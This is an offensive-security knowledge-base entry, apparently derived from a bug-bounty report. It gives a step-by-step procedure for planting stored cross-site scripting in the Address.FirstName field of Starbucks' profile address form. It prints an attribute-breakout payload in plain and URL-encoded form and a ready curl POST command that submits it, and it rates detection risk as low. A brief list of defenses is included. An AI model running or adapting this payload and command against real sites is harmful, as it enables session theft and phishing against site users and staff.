---
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-post-starbucks-address-xss]]'
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 1008ea3d-b01b-46b5-a59b-45125ddf563c
created_at: '2025-12-14T03:16:37.336Z'
updated_at: '2025-12-14T03:16:37.336Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-in-Address-FirstName

## Summary

This procedure injects a JavaScript payload into the Address.FirstName parameter during address creation in Starbucks' user profile, exploiting lack of server-side sanitization to store XSS that executes on profile view.

## Description

The Starbucks web application at /account/profile/AddressSave accepts POST requests to save user addresses without properly encoding the Address.FirstName field. This allows attribute breakout (e.g., closing quotes and injecting events like onmouseover) when the address is later rendered in HTML at /account/profile. Client-side limits (e.g., 15 characters) are bypassed server-side, enabling payloads that position fixed elements for easy triggering. Successful injection leads to arbitrary JS in the viewer's context, risking session theft or phishing, especially for support admins.

## Requirements

1. Valid Starbucks.com user account with login session (cookies required)
2. Access to HTTP client like curl or browser developer tools
3. Knowledge of URL encoding for payloads

## Defense

Defensive measures and detection strategies:

- Implement server-side input sanitization and output encoding (e.g., HTML entity encoding for attributes)
- Block or strip dangerous attributes and tags in user inputs
- Monitor for anomalous JS alerts or network requests from profiles
- Use Content Security Policy (CSP) to restrict inline scripts

## Objectives

1. Store malicious JavaScript in the user's address book
2. Bypass client-side validations for payload delivery
3. Enable execution for any profile viewer

## Instructions

### Step 1: Prepare the Payload

**Context**: Craft a URL-encoded payload that breaks out of the HTML attribute in FirstName, injects an onmouseover event, and adds a large fixed-position element for triggering.

No command needed; payload: `z" onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">`

URL-encoded: `z%22%20onmouseover%3D%22alert(%27Hackerone%27)%22%20style%3D%22position%3Afixed%3Bleft%3A0%3Btop%3A0%3Bwidth%3A9999px%3Bheight%3A9999px%3B%22%3E`

### Step 2: Submit the Malicious Address

**Context**: Send a POST request to save the address with the payload in Address.FirstName, including session cookies for authentication.

**Command** ([[commands/curl-post-starbucks-address-xss]]):
```bash
curl -X POST 'https://www.starbucks.com/account/profile/AddressSave' \
  -H 'Cookie: your-session-cookie-here' \
  -d 'Address.FirstName=z%22%20onmouseover%3D%22alert(%27Hackerone%27)%22%20style%3D%22position%3Afixed%3Bleft%3A0%3Btop%3A0%3Bwidth%3A9999px%3Bheight%3A9999px%3B%22%3E' \
  -d 'Address.LastName=Test' \
  -d 'Address.Street=123 Test St' \
  -d 'other-required-params'
```

> This command sends the payload; replace cookies and add other form fields as needed from form inspection. Expected output: Success response or redirect to profile.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-post-starbucks-address-xss]]

## Tools Used

- None

## Tags

- [[xss]]
- [[stored-xss]]
- [[web]]
